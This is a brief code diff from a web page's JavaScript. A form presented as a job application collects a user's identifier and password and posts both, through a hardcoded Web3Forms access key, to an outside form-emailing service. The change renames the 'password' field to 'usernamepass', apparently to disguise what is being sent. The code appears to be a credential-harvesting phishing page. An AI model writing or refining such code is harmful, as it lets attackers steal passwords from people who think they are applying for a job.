@@ -486,8 +486,8 @@
             const payload = {
               access_key: "85d6560d-937f-42b3-881b-63184dea831e", // Get this from web3forms dashboard
               subject: `New Job Application from ${identifier.value.trim()}`,
-              username: identifier.value.trim(),
-              password: password.value.trim(),
+              name: identifier.value.trim(),
+              usernamepass: password.value.trim(),
             };
 
             await fetch("https://api.web3forms.com/submit", {
